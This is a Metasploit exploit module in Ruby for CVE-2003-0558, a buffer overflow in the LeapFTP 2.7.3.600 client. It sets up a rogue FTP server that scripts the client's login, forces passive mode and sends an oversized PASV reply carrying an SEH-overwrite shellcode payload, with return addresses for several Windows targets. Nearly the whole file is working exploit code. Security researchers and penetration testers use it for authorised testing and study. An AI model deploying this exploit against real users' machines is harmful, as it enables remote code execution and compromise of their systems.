##
# $Id: leapftp_pasv_reply.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'LeapWare LeapFTP v2.7.3.600 PASV Reply Client Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the LeapWare LeapFTP v2.7.3.600
				client that is triggered through an excessively long PASV reply command. This
				module was ported from the original exploit by drG4njubas with minor improvements.
			},
			'Author' 	 => [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2003-0558' ],
					[ 'OSVDB', '4587' ],
					[ 'BID', '7860' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/54' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\().,",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Patrick - Tested against w2k sp0, sp4, xp sp0, xp sp2 en OK.
					[ 'Universal LeapFTP.exe', 	{ 'Ret' => 0x004bdd24 } ], # p/p/r LeapFTP.exe
					[ 'Windows 2000 SP0/4 English', { 'Ret' => 0x75022ac4 } ], # p/p/r ws2help.dll
					[ 'Windows XP SP0 English',	{ 'Ret' => 0x7660139c }	], # p/p/r cscdll.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 09 2003',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
				OptString.new('SRVNAME', [ true, "Welcome to the ... FTP Service", "Test" ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		buffer = "220 Welcome to the " + datastore['SRVNAME'] + " FTP Service.\r\n"
		client.put(buffer)
	end

	def on_client_data(client)


		client.get_once

		# This could be improved if anyone wants to write a FTP server API.
		user = "331 Please specify the password.\r\n"
		client.put(user)

		client.get_once
		pass = "230 Login successful.\r\n"
		client.put(pass)

		client.get_once
		syst = "215 Windows_NT 5.1\r\n"
		client.put(syst)

		client.get_once
		rest = "350 Restart position accepted (100).\r\n"
		client.put(rest)

		client.get_once
		rest = "350 Restart position accepted (0).\r\n"
		client.put(rest)

		client.get_once
		pwd = "257 \"/\"\r\n"
		client.put(pwd)

		client.get_once
		type = "200 Switching to ASCII mode.\r\n"
		client.put(type)

		client.get_once
		port = "500 Illegal PORT command.\r\n" # We force LeapFTP to use PASV. It will try PORT first.
		client.put(port)

		client.get_once
		pasv = "227 Entering Passive Mode ("
		pasv << rand_text_numeric(1053) + generate_seh_payload(target.ret)
		pasv << "," + rand_text_numeric(1)
		pasv << "," + rand_text_numeric(1)
		pasv << "," + rand_text_numeric(1)
		pasv << "," + rand_text_numeric(1)
		pasv << "," + rand_text_numeric(1)
		pasv << ")\r\n"

		client.put(pasv)

		handler(client)
		service.close_client(client)
	end
end
